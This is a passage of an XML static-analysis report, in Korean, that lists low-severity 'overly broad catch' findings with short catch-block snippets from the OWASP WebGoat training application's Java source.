	    // ignore the empty resultset on the insert.  There are a few more SQL Injection errors</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D63131F31FE82F69D54AC3ABC8AE0EC5" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSqlInjection.java 줄 216의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	    getLessonTracker(s).setCompleted(completed);
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AD3057D621A23E010FD6FA93E38C2A55" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SQLInjection.java 줄 363의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>363</LineStart>
<Snippet>		ue2.printStackTrace();
	    }
	    catch (Exception e)
	    {
		// All other errors send the user to the generic error page</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E68C10C62E833D5263B1BE22DEBC293C" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>FailOpenAuthentication.java 줄 83의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>83</LineStart>
<Snippet>		}
	    }
	    catch (Exception e)
	    {
		// The parameter was omitted. set fail open status complete</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="12A3C0D6E4EA75F33DE7C546E7279315" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 752의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>752</LineStart>
<Snippet>	    return getSubParameter(first, next);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D0655A36F396B3342192A45C3E486005" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 319의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>319</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="48B5E6339D876122EB95781108CA9FEA" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 859의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>859</LineStart>
<Snippet>	    return getWordParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AA3B788BFEB9F1DD68513034709CBE02" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 454의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>454</LineStart>
<Snippet>		}

		catch ( Exception e )
		{
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FFBD16BA1B908F2CA2E4EDF4EA5166E0" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java 줄 327의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>327</LineStart>
<Snippet>	    // ec.addElement( new P().addElement( pnfe.getMessage() ) );
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="49C20BD305A9B295DFA2813C4585C7E4" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java 줄 161의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>161</LineStart>
<Snippet>	    e.printStackTrace();
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CCA80F9E2661DACC74E02549AFDA676F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 298의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>298</LineStart>
<Snippet>	    return getDoubleParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="26B381B2F394F03B51B6003B7A7A46B1" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlStringInjection.java 줄 219의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="98EDAD12C6C20E28675A944C40E8E80F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java 줄 265의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>265</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("An error occurred in the woods");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1B4C8724B554916262DCBE717AAB9314" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>CommandInjection.java 줄 208의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>208</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BDC56F48BC90D0C9DA8A30A996E807CA" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SqlStringInjection.java 줄 149의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SqlStringInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlStringInjection.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D4A6DB2C8E94CE50A2E273F633013537" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>JSONInjection.java 줄 96의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JSONInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JSONInjection.java</FilePath>
<LineStart>96</LineStart>
<Snippet>	    }
	}
	catch (Exception ex)
	{
	    ex.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="74E7221786D423C031CA5781E1A2054F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccessControlMatrix.java 줄 111의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AccessControlMatrix.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AccessControlMatrix.java</FilePath>
<LineStart>111</LineStart>
<Snippet>		    }
		}
		catch (Exception e)
		{
		    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9493DF9C5B07B90B1B6F9FB2865676D5" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewDatabase.java 줄 102의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewDatabase.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ViewDatabase.java</FilePath>
<LineStart>102</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63F54D773B6561907974E90962DD28C1" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpSplitting.java 줄 134의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>134</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="36FB2DEBC9DD7242221D279784A38B7E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java 줄 403의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>403</LineStart>
<Snippet>		out.close();
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8DEA089B4BF38501CA6FF3F367300C30" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>EditProfile.java 줄 128의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>128</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9267A3AAD0C3DD40BA2262300F97C92E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java 줄 439의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>439</LineStart>
<Snippet>	    //			System.out.println("webgoat_guest replaced: " + getFileText( new BufferedReader( new FileReader( defacedpath ) ), false ) );
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3C0086D3A147C59ABE802666EFCD2A3A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Exec.java 줄 242의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>242</LineStart>
<Snippet>	    results.setInterrupted();
	}
	catch (Throwable t)
	{
	    results.setThrowable(t);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3B78149D3EED3A2287336A674636C22F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonAdapter.java 줄 307의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>307</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{}
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A0CE41B228462993FF0DFB6269F8E2B8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UserAdminScreen.java 줄 85의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/UserAdminScreen.java</FilePath>
<LineStart>85</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DDC85F586AE1E733BD704941FA16BB75" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>BasicAuthentication.java 줄 157의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>157</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6B7C6A8E3740379251E89308CDFD7B5C" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HttpOnly.java 줄 182의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpOnly.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpOnly.java</FilePath>
<LineStart>182</LineStart>
<Snippet>			original = value;
			
		} catch (Exception e) {
			e.printStackTrace();
		}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8DA2775F6B2F084EB3A0A72744F3C92A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>EditProfile.java 줄 189의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>189</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3BB2C747275BC799D81C708B2765F12B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java 줄 275의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>275</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
			s.setMessage( "Error authorizing" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7791650C0DB986C1B869C3692ACDFE1A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HiddenFieldTampering.java 줄 162의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HiddenFieldTampering.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HiddenFieldTampering.java</FilePath>
<LineStart>162</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D745B6780F7B2F483FE1E27D9C594BB3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SoapRequest.java 줄 431의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>431</LineStart>
<Snippet>	    {}
	}
	catch (Exception e)
	{}
	return null;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="18BB709AC92269C70311B414BF7A920B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java 줄 346의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>346</LineStart>
<Snippet>		ec.addElement(t);
	    }
	    catch (Exception e)
	    {
		ec</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8A9C2AEF79FD5061AB4F9694927E8CA3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DeleteProfile.java 줄 152의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>152</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error deleting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5EDC8D3BF676FC245E95014BBFF008C6" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java 줄 388의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>388</LineStart>
<Snippet>	    defaced = (!origText.equals(defacedText));
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="70C1FE9843AD1B95EC5BA6B8293D37AE" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>StoredXss.java 줄 271의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>271</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="77B5A27C842546B3787E9F84A3572696" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WSDLScanning.java 줄 232의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>232</LineStart>
